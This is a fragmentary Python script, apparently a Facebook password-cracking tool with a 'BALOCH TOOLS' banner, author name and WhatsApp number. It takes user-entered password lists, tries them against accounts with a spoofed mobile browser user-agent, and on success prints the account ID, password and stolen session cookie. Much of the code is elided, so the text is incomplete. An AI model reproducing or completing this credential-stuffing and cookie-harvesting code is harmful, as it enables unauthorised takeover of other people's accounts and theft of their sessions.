...
\____$$  |$$  _____|$$  _____|$$  __$$\ $$ |  $$ |$$ |  $$ |
 ...
 $$  /    $$ |      $$ |      $$\   $$ |$$ |  $$ |$$ |  $$ |
$$$$$$$$\ $$$$$$$$\ $$$$$$$$\ \$$$$$$  |$$ |  $$ |\$$$$$$  |
\________|\________|\________| \______/ \__|  \__| \______/XD
.....
.
                                          \033[1;36m BaloCh
--------------------------------------------------
[•] AUTHOR     : \033[1;32m BALOCH SAHB\033[1;35m
[•] STATUS     : \033[1;32mRANDOM TOOLS\033[1;37m
--------------------------------------------------
[•] VERSION\033[1;37m    :\033[1;32m 0.0.2 \033[1;37m" WELLCOME TO BALOCH TOOLS "\033[1;37m
[•]WhatsAp \033[1;36m    :03068237659\033[1;36m
[•] FROM\033[1;35m       :RAHIM YAR KHAN\033[1;35m
--------------------------------------------------"""
...
def svn_digit():
	...
	os.system('clear')
	print(logo)
	print('[•] MAX LIMIT [5000,4000,3000,2000,1000]')
	lines()
...
def chos():
    ...
    for bilal in range(passx):
        pww = input(f"[•] ENTER PASSWORDS {Baloch+1} : ")
        HamiiID.append(pww)
    ...
    try:
        for ps in pwx:
            ...
            'sec-fetch-mode': 'navigate',
		 	...
		 	'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX3511) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
             'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[BALOCH-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[BALOCH-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mBALOCH\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
